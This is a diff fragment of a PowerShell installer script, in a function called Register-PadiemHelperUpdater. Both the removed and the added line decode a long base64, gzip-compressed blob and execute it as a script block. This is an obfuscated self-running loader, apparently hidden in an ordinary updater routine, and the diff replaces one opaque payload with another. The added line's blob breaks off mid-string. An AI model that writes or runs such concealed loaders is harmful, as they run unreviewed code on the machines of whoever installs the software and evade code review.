@@ -139,7 +139,7 @@ function Install-PadiemAgentService {
 }
 
 function Register-PadiemHelperUpdater {
-  $b=[Convert]::FromBase64String('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');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GZipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);$reader=[IO.StreamReader]::new($gz);$source=$reader.ReadToEnd();$reader.Dispose();& ([scriptblock]::Create($source)) -Register -SourceText $source
+  $b=[Convert]::FromBase64String('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